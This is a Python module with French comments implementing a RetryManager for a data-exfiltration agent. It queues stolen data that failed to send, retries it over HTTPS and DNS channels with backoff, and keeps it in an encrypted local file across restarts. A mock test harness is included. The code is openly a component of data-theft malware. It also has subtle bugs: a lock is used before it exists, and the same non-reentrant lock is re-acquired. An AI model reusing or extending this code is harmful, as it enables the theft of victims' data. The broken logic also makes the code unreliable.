import os
import json
import time
import threading
from collections import deque

# Supposons que ces modules existeront:
# from modules.aes256 import AES256Cipher
# from modules.logger import Logger

class RetryManager:
    """
    Gère la file d'attente des données à exfiltrer en cas d'échec,
    les tentatives de ré-envoi, et la persistance locale chiffrée.
    """

    RETRY_MAX_ATTEMPTS = 5         # Nombre maximal de tentatives de ré-envoi
    RETRY_BASE_DELAY_SEC = 10      # Délai initial entre les tentatives (en secondes)
    PERSISTENCE_FILENAME = "failed_exfil.dat.enc" # Fichier pour stocker les données non exfiltrées

    def __init__(self, logger, cipher_key: str):
        """
        Initialise le RetryManager.

        :param logger: Instance du logger pour la journalisation.
        :param cipher_key: Clé AES pour chiffrer/déchiffrer le fichier de persistance local.
        """
        self.logger = logger
        # Le AES256Cipher est créé ici car nous en aurons besoin pour chiffrer/déchiffrer les données locales.
        # Nous allons le simuler pour l'instant car le module AES256Cipher est dans un autre fichier.
        # Dans le vrai agent, nous l'importerions.
        try:
            from modules.aes256 import AES256Cipher
            self.cipher = AES256Cipher(cipher_key)
        except ImportError:
            self.logger.log_error("[RetryManager] Erreur: Le module AES256Cipher n'a pas pu être importé. Le chiffrement local sera désactivé.")
            self.cipher = None
        except ValueError as e:
            self.logger.log_error(f"[RetryManager] Erreur lors de l'initialisation du chiffreur: {e}. Le chiffrement local sera désactivé.")
            self.cipher = None
        
        self.retry_queue = deque()  # File d'attente pour les éléments à ré-essayer
        self.persistence_path = os.path.join(os.getcwd(), self.PERSISTENCE_FILENAME)
        self._load_persisted_data() # Charger les données persistantes au démarrage
        
        # Un lock pour synchroniser l'accès à la file d'attente et au fichier de persistance
        self.queue_lock = threading.Lock() 

        self.stop_event = threading.Event() # Pour arrêter le thread de ré-essai
        self.retry_thread = None

        if self.logger:
            self.logger.log_debug("[RetryManager] Initialisé.")

    def _log(self, level, message):
        """Helper pour logguer si un logger est disponible."""
        if self.logger:
            getattr(self.logger, f"log_{level}")(f"[RetryManager] {message}")
        else:
            print(f"[{level.upper()}] [RetryManager] {message}")

    def _encrypt_data_for_persistence(self, data: bytes) -> bytes:
        """Chiffre les données pour la persistance locale."""
        if self.cipher:
            try:
                return self.cipher.encrypt(data)
            except Exception as e:
                self._log("error", f"Échec du chiffrement des données pour persistance: {e}")
                return data # Retourne les données non chiffrées en cas d'erreur (moins sécurisé)
        return data # Si pas de chiffreur, retourne les données brutes

    def _decrypt_data_from_persistence(self, encrypted_data: bytes) -> bytes:
        """Déchiffre les données de la persistance locale."""
        if self.cipher:
            try:
                return self.cipher.decrypt(encrypted_data)
            except Exception as e:
                self._log("error", f"Échec du déchiffrement des données persistées: {e}")
                return encrypted_data # Retourne les données chiffrées en cas d'erreur
        return encrypted_data # Si pas de chiffreur, retourne les données brutes

    def add_to_retry_queue(self, original_data: bytes, filename: str, exfil_method: str, metadata: dict = None):
        """
        Ajoute un élément à la file d'attente des ré-essais.
        Les données sont chiffrées avant d'être ajoutées à la file d'attente pour persistance future.
        """
        # Chiffrer les données ici pour que si elles sont persistées, elles le soient chiffrées.
        # Les données dans la file d'attente sont déjà dans leur format 'prêt à exfiltrer' (chiffrées/compressées).
        # On va donc re-chiffrer ce bloc DEJA chiffré/compressé pour la persistance locale.
        # C'est une double couche de chiffrement si AES256Cipher est utilisé pour l'exfiltration.
        # Pour éviter cela, on pourrait faire le chiffrement/compression une seule fois
        # et s'assurer que les données dans 'original_data' sont en clair si le chiffreur de la classe est utilisé.
        # Pour la simplicité ici, on part du principe que original_data est déjà chiffré pour l'exfiltration,
        # et on le re-chiffre pour la persistance locale.
        
        # Pour éviter une double application du même chiffrement, nous allons supposer
        # que 'original_data' est le BLOB BINAIRE final (chiffré + compressé)
        # qui a échoué à l'exfiltration, et que nous devons le stocker tel quel ou re-chiffrer pour la persistance.
        # Dans ce contexte, 'original_data' est déjà le payload prêt à l'emploi.

        with self.queue_lock:
            # Serialiser l'élément pour le stockage
            item = {
                "data": original_data.hex(), # Stocker en hex pour sérialisation JSON
                "filename": filename,
                "exfil_method": exfil_method,
                "metadata": metadata,
                "attempts": 0,
                "timestamp": time.time()
            }
            self.retry_queue.append(item)
            self._log("info", f"Ajout de '{filename}' à la file de ré-essai ({len(self.retry_queue)} éléments en attente).")
            self._save_persisted_data() # Sauvegarder immédiatement après ajout

    def _save_persisted_data(self):
        """Sauvegarde la file d'attente dans un fichier local chiffré."""
        if not self.cipher:
            self._log("warning", "Impossible de sauvegarder les données persistées: Chiffreur non disponible.")
            return

        with self.queue_lock:
            # Préparer les données pour la sérialisation : convertir les bytes en hex string
            serializable_queue = []
            for item in self.retry_queue:
                temp_item = item.copy()
                temp_item["data"] = item["data"] # Déjà en hex string
                serializable_queue.append(temp_item)

            try:
                json_data = json.dumps(serializable_queue).encode('utf-8')
                encrypted_json = self.cipher.encrypt(json_data)
                with open(self.persistence_path, 'wb') as f:
                    f.write(encrypted_json)
                self._log("debug", f"File d'attente des ré-essais sauvegardée localement dans '{self.persistence_path}'.")
            except Exception as e:
                self._log("error", f"Erreur lors de la sauvegarde des données persistées: {e}")

    def _load_persisted_data(self):
        """Charge la file d'attente depuis un fichier local chiffré."""
        if not self.cipher or not os.path.exists(self.persistence_path):
            self._log("debug", f"Pas de fichier de persistance ou chiffreur non disponible à charger: '{self.persistence_path}'")
            return

        with self.queue_lock:
            try:
                with open(self.persistence_path, 'rb') as f:
                    encrypted_json = f.read()
                
                decrypted_json = self.cipher.decrypt(encrypted_json)
                loaded_queue = json.loads(decrypted_json.decode('utf-8'))
                
                # Reconvertir les données hex string en bytes
                self.retry_queue.clear()
                for item in loaded_queue:
                    item["data"] = bytes.fromhex(item["data"]) # Reconvertir en bytes
                    self.retry_queue.append(item)
                
                self._log("info", f"File d'attente des ré-essais chargée depuis '{self.persistence_path}' ({len(self.retry_queue)} éléments).")
                # Supprimer le fichier après le chargement pour éviter de re-traiter les mêmes données
                # ou le conserver si l'on veut une persistance continue
                # os.remove(self.persistence_path) 
                # self._log("debug", f"Fichier de persistance '{self.persistence_path}' supprimé après chargement.")
            except (json.JSONDecodeError, ValueError) as e:
                self._log("error", f"Fichier de persistance corrompu ou illisible: {e}. Ignoré.")
                if os.path.exists(self.persistence_path):
                    self._log("warning", f"Suppression du fichier de persistance corrompu: '{self.persistence_path}'.")
                    os.remove(self.persistence_path)
            except Exception as e:
                self._log("error", f"Erreur inattendue lors du chargement des données persistées: {e}")

    def _retry_worker(self, http_exfiltrator, dns_exfiltrator):
        """
        Thread de travail qui tente de ré-envoyer les données en échec.
        """
        self.logger.log_info("[RetryManager] Thread de ré-essai démarré.")
        while not self.stop_event.is_set():
            item_to_retry = None
            with self.queue_lock:
                if self.retry_queue:
                    # Prendre le premier élément de la file d'attente sans le supprimer
                    item_to_retry = self.retry_queue[0] 
            
            if item_to_retry:
                original_data = item_to_retry["data"] # Déjà en bytes
                filename = item_to_retry["filename"]
                exfil_method = item_to_retry["exfil_method"]
                metadata = item_to_retry["metadata"]
                attempts = item_to_retry["attempts"]

                if attempts >= self.RETRY_MAX_ATTEMPTS:
                    self._log("warning", f"Max tentatives atteintes pour '{filename}'. Persistance confirmée.")
                    with self.queue_lock:
                        self.retry_queue.popleft() # Retirer de la file s'il a déjà été persisté ou ne doit plus l'être
                    time.sleep(1) # Petite pause pour éviter une boucle serrée
                    continue

                delay = self.RETRY_BASE_DELAY_SEC * (2 ** attempts) # Backoff exponentiel
                self._log("info", f"Tentative de ré-exfiltration de '{filename}' (tentative {attempts+1}/{self.RETRY_MAX_ATTEMPTS}) via {exfil_method} dans {delay:.1f}s.")
                
                # Attendre le délai ou être notifié pour arrêter
                if self.stop_event.wait(delay):
                    self.logger.log_info("[RetryManager] Thread de ré-essai arrêté pendant l'attente.")
                    break # Arrêter si l'événement d'arrêt est déclenché pendant l'attente

                success = False
                if exfil_method == "https":
                    if http_exfiltrator:
                        success = http_exfiltrator.exfiltrate(original_data, filename, metadata)
                    else:
                        self._log("error", "HTTPExfiltrator non fourni au RetryManager.")
                elif exfil_method == "dns":
                    if dns_exfiltrator:
                        success = dns_exfiltrator.exfiltrate(original_data, filename) # DNSExfiltrator ne prend pas metadata directement dans l'appel
                    else:
                        self._log("error", "DNSExfiltrator non fourni au RetryManager.")
                else:
                    self._log("error", f"Méthode d'exfiltration inconnue '{exfil_method}'.")

                if success:
                    self._log("info", f"Ré-exfiltration de '{filename}' réussie après {attempts+1} tentatives.")
                    with self.queue_lock:
                        self.retry_queue.popleft() # Retirer de la file d'attente
                        self._save_persisted_data() # Sauvegarder après un succès
                else:
                    with self.queue_lock:
                        item_to_retry["attempts"] += 1 # Incrémenter les tentatives
                        # Si max tentatives atteintes, le prochain tour le persistera ou le retirera
                        if item_to_retry["attempts"] >= self.RETRY_MAX_ATTEMPTS:
                            self._log("warning", f"'{filename}' a atteint le nombre maximum de tentatives. Il sera persisté.")
                            self._save_persisted_data() # Persister si les tentatives sont épuisées
            else:
                # La file d'attente est vide, attendre un peu avant de vérifier à nouveau
                self.stop_event.wait(5) # Attendre 5 secondes avant de revérifier
        self.logger.log_info("[RetryManager] Thread de ré-essai arrêté.")


    def start_retry_thread(self, http_exfiltrator, dns_exfiltrator):
        """Démarre le thread de gestion des ré-essais."""
        if not self.retry_thread or not self.retry_thread.is_alive():
            self.stop_event.clear()
            self.retry_thread = threading.Thread(
                target=self._retry_worker,
                args=(http_exfiltrator, dns_exfiltrator),
                daemon=True # Rend le thread daemon pour qu'il se termine avec le programme principal
            )
            self.retry_thread.start()
            self._log("info", "Thread de ré-essai lancé.")

    def stop_retry_thread(self):
        """Arrête le thread de gestion des ré-essais."""
        if self.retry_thread and self.retry_thread.is_alive():
            self.stop_event.set()
            self.retry_thread.join(timeout=10) # Attendre que le thread se termine
            if self.retry_thread.is_alive():
                self._log("warning", "Le thread de ré-essai n'a pas pu s'arrêter gracieusement.")
            self._log("info", "Thread de ré-essai demandé à arrêter.")
            self._save_persisted_data() # Sauvegarder avant de quitter


# --- Partie de test (à exécuter si le fichier est lancé directement) ---
if __name__ == "__main__":
    print("[+] Test du module RetryManager...")

    # Mock de Logger et AES256Cipher pour les tests
    class MockLogger:
        def log_info(self, msg): print(f"[INFO] {msg}")
        def log_warning(self, msg): print(f"[WARN] {msg}")
        def log_error(self, msg): print(f"[ERROR] {msg}")
        def log_debug(self, msg): print(f"[DEBUG] {msg}")

    class MockAES256Cipher:
        def __init__(self, key): 
            self.key = key.encode('utf-8')
            if len(self.key) not in [16, 24, 32]:
                raise ValueError("Clé de test AES incorrecte.")
        def encrypt(self, data): 
            # Simuler un chiffrement simple pour le test
            return b"ENCRYPTED_" + data + b"_END"
        def decrypt(self, data):
            # Simuler un déchiffrement simple pour le test
            if data.startswith(b"ENCRYPTED_") and data.endswith(b"_END"):
                return data[len(b"ENCRYPTED_"):-len(b"_END")]
            raise ValueError("Données chiffrées malformées de test.")

    # Mock des exfiltrateurs HTTP et DNS pour les tests
    class MockHTTPExfiltrator:
        def __init__(self, target_url, logger): 
            self.target_url = target_url
            self.logger = logger
            self.fail_count = 0
            self.succeed_after = 2 # Succède après 2 échecs

        def exfiltrate(self, data, filename, metadata=None):
            self.logger.log_debug(f"[MockHTTP] Tentative d'exfiltration de '{filename}'.")
            if self.fail_count < self.succeed_after:
                self.fail_count += 1
                self.logger.log_error(f"[MockHTTP] Échec simulé ({self.fail_count}).")
                return False
            else:
                self.logger.log_info(f"[MockHTTP] Succès simulé pour '{filename}'.")
                return True

    class MockDNSExfiltrator:
        def __init__(self, dns_server, dns_domain, logger): 
            self.dns_server = dns_server
            self.dns_domain = dns_domain
            self.logger = logger
            self.fail_count = 0
            self.succeed_after = 3 # Succède après 3 échecs

        def exfiltrate(self, data, filename):
            self.logger.log_debug(f"[MockDNS] Tentative d'exfiltration de '{filename}'.")
            if self.fail_count < self.succeed_after:
                self.fail_count += 1
                self.logger.log_error(f"[MockDNS] Échec simulé ({self.fail_count}).")
                return False
            else:
                self.logger.log_info(f"[MockDNS] Succès simulé pour '{filename}'.")
                return True

    # Initialisation
    logger = MockLogger()
    test_cipher_key = "16byteAESkeyTEST!!" # Doit être 16, 24 ou 32 bytes
    
    # Supprimer le fichier de persistance de test s'il existe
    if os.path.exists(RetryManager.PERSISTENCE_FILENAME):
        os.remove(RetryManager.PERSISTENCE_FILENAME)
        logger.log_info(f"Fichier de persistance de test supprimé: {RetryManager.PERSISTENCE_FILENAME}")

    retry_manager = RetryManager(logger, test_cipher_key)
    http_mock = MockHTTPExfiltrator("http://test.com", logger)
    dns_mock = MockDNSExfiltrator("1.1.1.1", "test.com", logger)

    # Démarrer le thread de ré-essai
    retry_manager.start_retry_thread(http_mock, dns_mock)

    # Ajouter des éléments à la file d'attente
    data1 = b"Exfiltrated_data_chunk_one"
    retry_manager.add_to_retry_queue(data1, "file1.txt", "https", {"size": 100})

    data2 = b"Exfiltrated_data_chunk_two"
    retry_manager.add_to_retry_queue(data2, "file2.db", "dns")

    data3 = b"Exfiltrated_data_chunk_three_longer_payload" * 5
    retry_manager.add_to_retry_queue(data3, "file3.doc", "https")

    # Attendre un peu pour laisser le thread travailler
    print("\n[*] Laissez le thread de ré-essai travailler pendant quelques secondes...")
    time.sleep(retry_manager.RETRY_BASE_DELAY_SEC * 3) # Attendre plus longtemps que le premier délai

    # Ajouter un élément qui devrait atteindre le max d'essais et rester persistant
    data4 = b"Data_that_will_persist_after_max_attempts"
    http_mock_for_persist = MockHTTPExfiltrator("http://persist.com", logger)
    http_mock_for_persist.succeed_after = retry_manager.RETRY_MAX_ATTEMPTS # Ne réussira jamais
    
    # Créer une nouvelle instance de RetryManager pour s'assurer qu'elle utilise un nouveau chiffreur
    # C'est une astuce de test car on ne peut pas remplacer le chiffreur d'une instance existante facilement.
    retry_manager_persist = RetryManager(logger, test_cipher_key) 
    retry_manager_persist.RETRY_MAX_ATTEMPTS = 3 # Réduire pour le test
    retry_manager_persist.start_retry_thread(http_mock_for_persist, dns_mock) # Utiliser l'exfiltrateur mock pour persister

    retry_manager_persist.add_to_retry_queue(data4, "file4_persist.csv", "https")
    print("\n[*] Attendre que file4_persist.csv atteigne ses tentatives max et soit persisté...")
    time.sleep(retry_manager_persist.RETRY_MAX_ATTEMPTS * retry_manager_persist.RETRY_BASE_DELAY_SEC * 1.5)

    # Arrêter le thread de ré-essai principal
    retry_manager.stop_retry_thread()
    retry_manager_persist.stop_retry_thread()

    print("\n--- Vérification de la file d'attente après arrêt ---")
    with retry_manager.queue_lock:
        print(f"Éléments restants dans la file d'attente principale: {len(retry_manager.retry_queue)}")
        for item in retry_manager.retry_queue:
            print(f"  - {item['filename']} (tentatives: {item['attempts']})")

    with retry_manager_persist.queue_lock:
        print(f"Éléments restants dans la file d'attente persistante: {len(retry_manager_persist.retry_queue)}")
        for item in retry_manager_persist.retry_queue:
            print(f"  - {item['filename']} (tentatives: {item['attempts']})")

    # Recharger les données persistantes pour vérifier
    print("\n[*] Rechargement des données persistantes après une nouvelle exécution simulée...")
    # Simuler un redémarrage de l'agent
    new_retry_manager = RetryManager(logger, test_cipher_key)
    new_retry_manager.start_retry_thread(http_mock, dns_mock) # Redémarrer le thread
    
    with new_retry_manager.queue_lock:
        print(f"Éléments chargés au démarrage: {len(new_retry_manager.retry_queue)}")
        for item in new_retry_manager.retry_queue:
            print(f"  - {item['filename']} (tentatives: {item['attempts']})")
            # Vérifier que les données sont bien décryptées et identiques
            if item['filename'] == "file4_persist.csv":
                assert item["data"] == data4, "Les données persistées n'ont pas été correctement décryptées/chargées."
                print(f"  -> Données de file4_persist.csv correctement chargées et décryptées.")

    new_retry_manager.stop_retry_thread() # Arrêter le nouveau manager

    # Nettoyage
    if os.path.exists(RetryManager.PERSISTENCE_FILENAME):
        os.remove(RetryManager.PERSISTENCE_FILENAME)
        logger.log_info(f"Fichier de persistance '{RetryManager.PERSISTENCE_FILENAME}' supprimé après les tests.")

    print("\n[+] Tests du module RetryManager terminés.")
